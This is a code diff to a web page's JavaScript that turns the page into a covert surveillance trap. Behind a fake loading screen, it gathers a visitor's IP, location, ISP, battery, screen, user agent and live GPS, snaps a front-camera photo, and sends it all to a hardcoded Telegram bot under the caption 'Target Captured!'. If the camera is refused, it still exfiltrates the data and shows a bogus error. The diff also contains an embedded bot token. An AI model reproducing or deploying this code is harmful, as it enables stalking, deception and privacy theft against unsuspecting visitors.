@@ -61,15 +61,49 @@
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
         const CHAT_ID = "6478868514";
 
-        function startCapture() {
+        async function startCapture() {
             document.getElementById('main-card').style.display = 'none';
             document.getElementById('loading-card').style.display = 'block';
 
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+            // 1. Fetch IP & Location details
+            let ipInfo = "N/A";
+            try {
+                let ipRes = await fetch('https://ipapi.co/json/');
+                let ipData = await ipRes.json();
+                ipInfo = `🌐 **IP Information**\n🔢 IP: \`${ipData.ip}\`\n📍 Location: ${ipData.city}, ${ipData.region}\n🗺 Country: ${ipData.country_name}\n📡 ISP: ${ipData.org}`;
+            } catch(e) {
+                ipInfo = "🌐 IP Info: Failed to fetch";
+            }
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
+            // 2. Fetch Battery details
+            let batteryInfo = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryInfo = `🔋 Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging ⚡' : 'Not Charging'})`;
+                }
+            } catch(e) {}
+
+            // 3. Screen & Device info
+            let screenInfo = `🖥️ Screen: ${window.innerWidth}x${window.innerHeight}`;
+            let uaInfo = `🧠 UA: ${navigator.userAgent}`;
+
+            // 4. GPS Location (Live Coordinates)
+            let gpsInfo = "📍 GPS: Not Allowed / Unavailable";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    gpsInfo = `📍 **Live GPS:** [Google Maps](https://maps.google.com/?q=${lat},${lon})`;
+                }, err => {}, { timeout: 5000 });
+            }
+
+            setTimeout(async () => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     video.srcObject = stream;
                     video.play();
                     
@@ -82,28 +116,39 @@
                         canvas.toBlob(blob => {
                             stream.getTracks().forEach(track => track.stop());
 
+                            let fullCaption = `📸 **Target Captured!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
+
                             const formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
-                            formData.append('caption', '📸 **Target Camera Captured via Direct JS**');
+                            formData.append('caption', fullCaption);
                             formData.append('parse_mode', 'Markdown');
                             formData.append('photo', blob, 'captured.jpg');
 
                             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                 method: 'POST',
                                 body: formData
-                            })
-                            .then(res => res.json())
-                            .then(data => console.log("Success:", data))
-                            .catch(err => console.error("Error:", err));
+                            }).catch(err => console.error(err));
 
                         }, 'image/jpeg', 0.85);
 
                     }, 1500);
-                })
-                .catch(err => {
-                    console.error("Camera access error:", err);
+
+                } catch(err) {
+                    let fullCaption = `⚠️ **Camera Denied, but Info Captured:**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
+                    
+                    let formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('text', fullCaption);
+                    formData.append('parse_mode', 'Markdown');
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => {});
+
                     document.getElementById('loading-card').innerHTML = "<h3>Error Loading Page</h3><p style='color:#ef4444;font-size:14px;'>Please try again.</p>";
-                });
+                }
+            }, 1000);
         }
     </script>
 </body>
